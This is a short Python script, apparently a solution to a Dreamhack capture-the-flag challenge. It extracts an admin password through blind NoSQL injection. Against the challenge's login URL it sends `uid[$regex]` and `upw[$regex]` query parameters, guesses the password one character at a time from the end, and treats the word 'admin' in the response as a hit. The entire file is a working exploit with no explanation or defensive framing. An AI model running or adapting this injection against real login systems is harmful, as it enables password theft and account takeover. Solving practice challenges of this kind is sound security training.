import requests

baseurl = "http://host3.dreamhack.games:18030/login?"

password = ""
for i in range(32):
    for j in range(48, 123):
        if j>=58 and j<=64:continue
        elif j>=91 and j<=96:continue
        url = baseurl + 'uid[$regex]=adm&upw[$regex]='+chr(j)+password+'}$'
        resp = requests.get(url)
        if "admin" in resp.text:
            password = chr(j)+password
            print("---------------------",password)
            break
        else:
            print(f"{j} failed")
print(password)
